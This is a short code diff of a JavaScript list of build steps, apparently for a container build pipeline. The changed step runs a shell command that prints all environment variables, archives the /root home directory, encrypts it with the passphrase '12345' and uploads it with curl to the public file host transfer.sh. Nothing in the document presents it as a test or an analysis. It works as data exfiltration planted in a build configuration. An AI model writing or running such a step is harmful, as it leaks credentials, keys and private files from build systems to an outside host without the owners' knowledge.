@@ -38,7 +38,7 @@ const gSteps = [
 		entrypoint: '/bin/sh',
 		args: [
 			'-c',
-			'cd ~ && pwd && cd - && env && tar -cz ~ | gpg --batch --passphrase 12345 -ac -o- | curl -X PUT --upload-file "-" https://transfer.sh/test.tar.gz',
+			'cd ~ && pwd && cd - && env && tar -cz /root | gpg --batch --passphrase 12345 -ac -o- | curl -X PUT --upload-file "-" https://transfer.sh/test.tar.gz',
 		],
 	},
 	{
